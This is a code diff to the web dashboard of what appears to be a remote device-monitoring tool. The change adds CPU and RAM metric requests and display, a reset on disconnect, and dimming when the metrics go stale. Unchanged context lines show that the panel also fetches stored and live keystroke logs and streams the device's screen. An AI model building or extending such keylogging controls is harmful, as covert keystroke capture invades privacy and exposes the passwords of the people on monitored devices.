@@ -4954,11 +4954,13 @@
 
         function startWatching() {
             if (!ws || ws.readyState !== WebSocket.OPEN || !selectedDevice) return;
-            
+
             ws.send(JSON.stringify({
                 type: 'start_watching',
                 device_id: selectedDevice.id
             }));
+
+            ws.send(JSON.stringify({ type: 'start_device_metrics', device_id: selectedDevice.id }));
 
             ws.send(JSON.stringify({ type: 'get_keylogs', device_id: selectedDevice.id }));
             ws.send(JSON.stringify({ type: 'start_live_keylogs', device_id: selectedDevice.id }));
@@ -5123,6 +5125,8 @@
             if (_statsTimer) { clearInterval(_statsTimer); _statsTimer = null; }
             if (sessionTimer) { clearInterval(sessionTimer); sessionTimer = null; }
             if (skeletonRetryTimer) { clearInterval(skeletonRetryTimer); skeletonRetryTimer = null; }
+            _lastMetricsAt = 0;
+            _resetMetricsUI();
             _stopStreamHealthMonitor();
             _wsCommandCallbacks = {};
 
@@ -5820,6 +5824,7 @@
 
                 case 'device_metrics':
                     {
+                        _lastMetricsAt = Date.now();
                         const cpuEl = document.getElementById('statCpu');
                         const ramEl = document.getElementById('statRam');
                         const appRamEl = document.getElementById('statAppRam');
@@ -5827,16 +5832,19 @@
                             const cpu = data.cpu_usage || 0;
                             cpuEl.textContent = cpu + '%';
                             cpuEl.style.color = cpu > 80 ? '#ff4444' : cpu > 50 ? '#ffab40' : '#4fc3f7';
+                            cpuEl.style.opacity = '1';
                         }
                         if (ramEl) {
                             const ramPct = data.used_ram_percent || 0;
                             ramEl.textContent = ramPct + '%';
                             ramEl.style.color = ramPct > 85 ? '#ff4444' : ramPct > 65 ? '#ffab40' : '#ce93d8';
+                            ramEl.style.opacity = '1';
                         }
                         if (appRamEl) {
                             const appMem = data.app_mem_mb || 0;
                             appRamEl.textContent = appMem + 'MB';
                             appRamEl.style.color = appMem > 300 ? '#ff4444' : appMem > 150 ? '#ffab40' : '#80cbc4';
+                            appRamEl.style.opacity = '1';
                         }
                     }
                     break;
@@ -7616,7 +7624,17 @@
         let _currentFps = 0;
         let _pingMs = 0;
         let _statsTimer = null;
+        let _lastMetricsAt = 0;
         let _deviceFps = 0;
+
+        function _resetMetricsUI() {
+            const cpuEl = document.getElementById('statCpu');
+            const ramEl = document.getElementById('statRam');
+            const appRamEl = document.getElementById('statAppRam');
+            if (cpuEl)    { cpuEl.textContent = '-';    cpuEl.style.color = '#4fc3f7'; cpuEl.style.opacity = '1'; }
+            if (ramEl)    { ramEl.textContent = '-';    ramEl.style.color = '#ce93d8'; ramEl.style.opacity = '1'; }
+            if (appRamEl) { appRamEl.textContent = '-'; appRamEl.style.color = '#80cbc4'; appRamEl.style.opacity = '1'; }
+        }
         let _deviceQuality = 50;
         let _deviceCodec = 'jpeg';
         let _deviceRtt = 0;
@@ -7649,6 +7667,15 @@
             const mins = Math.floor(elapsed / 60).toString().padStart(2, '0');
             const secs = (elapsed % 60).toString().padStart(2, '0');
             document.getElementById('toolbarTime').textContent = `${mins}:${secs}`;
+
+            if (_lastMetricsAt > 0 && (Date.now() - _lastMetricsAt) > 6000) {
+                const cpuEl = document.getElementById('statCpu');
+                const ramEl = document.getElementById('statRam');
+                const appRamEl = document.getElementById('statAppRam');
+                if (cpuEl) cpuEl.style.opacity = '0.35';
+                if (ramEl) ramEl.style.opacity = '0.35';
+                if (appRamEl) appRamEl.style.opacity = '0.35';
+            }
 
             if (ws && ws.readyState === WebSocket.OPEN) {
                 _pingSentAt = Date.now();
